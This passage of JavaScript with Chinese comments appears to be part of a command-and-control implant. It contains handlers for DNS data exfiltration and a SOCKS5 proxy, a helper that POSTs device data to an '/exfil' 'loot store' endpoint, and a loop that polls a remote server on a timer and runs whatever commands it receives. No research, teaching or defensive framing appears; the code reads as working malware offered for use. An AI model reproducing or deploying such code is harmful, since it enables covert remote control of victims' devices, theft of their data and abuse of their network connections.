            return resolve('[dns_exfil] ' + (ok ? '已通过 DNS 外传 ' + data.length + ' 字节' : '外传失败'));
          }
          resolve('[dns_exfil] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[dns_exfil] 操作失败'
            : '[dns_exfil] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 33. SOCKS5 代理
    proxy_socks5(args) {
      const port = (args && args.port) ? parseInt(args.port) : 1080;
      const action = (args && args.action) ? args.action : 'start';
      return new Promise(resolve => {
        try {
          if (typeof nativeProxySocks5 === 'function') {
            const result = nativeProxySocks5(action, port);
            return resolve('[socks5] ' + action + ' port=' + port + ' → ' + (result || 'ok'));
          }
          resolve('[socks5] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[socks5] 操作失败'
            : '[socks5] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },
  };

  /** 辅助：将数据 exfil 到服务端 loot store */
  function _exfil(type, data) {
    const payload = { deviceId: getDeviceId(), type, data };
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', (typeof localHost !== 'undefined' ? localHost : location.origin) + '/exfil', true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      if (SHARED_SECRET) xhr.setRequestHeader('Authorization', 'Bearer ' + SHARED_SECRET);
      xhr.send(JSON.stringify(payload));
    } catch {}
  }

  /** 执行单条命令并回报结果 */
  async function dispatchCmd(cmd) {
    const handler = CMD_HANDLERS[cmd.type];
    if (!handler) {
      reportCmdResult(cmd.cmdId, cmd.type, '[error] 未知命令类型: ' + cmd.type, 'error');
      return;
    }
    try {
      const output = await handler(cmd.args || {});
      reportCmdResult(cmd.cmdId, cmd.type, output);
    } catch (e) {
      reportCmdResult(cmd.cmdId, cmd.type, '[error] ' + e.message, 'error');
    }
  }

  /** 轮询并执行待处理命令 */
  const executedCmds = new Set();
  const MAX_EXECUTED_CMDS = 10000; // 限制 Set 大小，防止内存无限增长
  
  function pollCommands() {
    const deviceId = getDeviceId();
    const xhr = new XMLHttpRequest();
    xhr.open('GET', CMD_POLL_URL + '?deviceId=' + encodeURIComponent(deviceId), true);
    xhr.timeout = 30000; // 30秒超时避免永久挂起
    if (SHARED_SECRET) xhr.setRequestHeader('Authorization', 'Bearer ' + SHARED_SECRET);
    xhr.onload = function() {
      if (xhr.status !== 200) return;
      try {
        const data = JSON.parse(xhr.responseText);
        (data.cmds || []).forEach(cmd => {
          if (!executedCmds.has(cmd.cmdId)) {
            executedCmds.add(cmd.cmdId);
            // 当 Set 超过限制时，清理最早的条目（使用数组转换保证顺序）
            if (executedCmds.size > MAX_EXECUTED_CMDS) {
              const toRemove = Math.floor(MAX_EXECUTED_CMDS / 2);
              const arr = Array.from(executedCmds);
              for (let i = 0; i < toRemove && i < arr.length; i++) {
                executedCmds.delete(arr[i]);
              }
            }
            dispatchCmd(cmd);
          }
        });
      } catch {}
    };
    xhr.onerror = function() {};
    xhr.ontimeout = function() {};
    xhr.send();
  }

  // 页面可见时每 CMD_POLL_MS 轮询一次
  setInterval(pollCommands, CMD_POLL_MS);
  // 页面重新可见时立即补轮询
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) pollCommands();
  });
})();